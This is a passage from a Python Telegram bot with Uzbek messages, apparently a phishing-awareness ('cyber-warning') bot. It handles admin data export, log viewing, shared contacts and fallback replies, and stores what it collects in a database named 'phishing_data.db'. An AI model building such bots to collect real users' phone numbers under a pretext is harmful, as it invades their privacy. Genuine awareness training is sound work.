        bot.send_document(chat_id, open('export_data.json', 'rb'))
    
    elif action == 'logs':
        c.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT 20")
        logs = c.fetchall()
        
        if not logs:
            bot.send_message(chat_id, "📭 Loglar topilmadi.")
        else:
            log_text = "**📜 So'nggi 20 ta log:**\n\n"
            for log in logs:
                log_text += f"• [{log[4]}] `{log[1]}` → {log[2]}: {log[3]}\n"
            
            # Split if too long
            if len(log_text) > 4000:
                for i in range(0, len(log_text), 4000):
                    bot.send_message(chat_id, log_text[i:i+4000], parse_mode="Markdown")
            else:
                bot.send_message(chat_id, log_text, parse_mode="Markdown")

    conn.close()
    safe_answer_callback(call, "✅ Bajarildi!")

# ============== MATNLI XABARLARNI USHLASH ==============
@bot.message_handler(func=lambda message: True)
def fallback_handler(message):
    chat_id = message.chat.id

    if message.content_type == 'contact':
        get_phone_handler(message)
        return

    text = (message.text or "").lower()
    if "a'zo" in text or "обо" in text or "subscribe" in text:
        bot.send_message(chat_id, "👉 Tugmani bosish uchun /start ni bosing.")
        return

    bot.send_message(chat_id, "Iltimos, /start buyrug'ini bosing yoki yuqoridagi tugmalardan foydalaning.")

# ============== BOTNI ISHGA TUSHIRISH ==============
if __name__ == "__main__":
    print("=" * 50)
    print("Kiber-ogohlantirish boti ishga tushdi!")
    print(f"Admin ID: {ADMIN_ID}")
    print(f"Ma'lumotlar bazasi: phishing_data.db")
    print("=" * 50)
    
    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            print(f"Xatolik: {e}")
            print("Qayta ulanish 5 soniyadan keyin...")
            time.sleep(5)
